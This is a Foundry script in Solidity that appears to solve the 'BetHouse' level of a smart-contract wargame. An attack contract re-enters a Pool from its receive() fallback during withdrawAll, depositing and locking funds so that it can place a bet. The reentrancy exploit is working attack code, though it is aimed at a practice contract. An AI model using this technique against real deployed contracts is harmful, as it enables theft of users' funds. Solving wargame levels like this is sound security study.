// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import "forge-std/Script.sol";
import "src/levels/BetHouse/BetHouse.sol";

contract BetHouseAttackScript is Script {
    function setUp() public {}

    function run() public {
        BetHouse target = BetHouse(0x0000000000000000000000000000000000000000); // Insert target target address

        vm.startBroadcast();
        BetHouseAttack attackContract =
            new BetHouseAttack(address(target), payable(target.pool()), Pool(target.pool()).depositToken());
        PoolToken(Pool(target.pool()).depositToken()).transfer(address(attackContract), 5);
        attackContract.attack{value: 0.001 ether}();
        vm.stopBroadcast();
    }
}

contract BetHouseAttack {
    BetHouse target;
    Pool pool;
    PoolToken depositToken;
    address bettor;

    constructor(address target_, address payable pool_, address depositToken_) payable {
        target = BetHouse(target_);
        pool = Pool(pool_);
        depositToken = PoolToken(depositToken_);
        bettor = msg.sender;
    }

    function attack() external payable {
        depositToken.approve(address(pool), 5);
        pool.deposit{value: 0.001 ether}(5);
        pool.withdrawAll();
    }

    receive() external payable {
        depositToken.approve(address(pool), 5);
        pool.deposit(5);
        pool.lockDeposits();
        target.makeBet(bettor);
    }
}
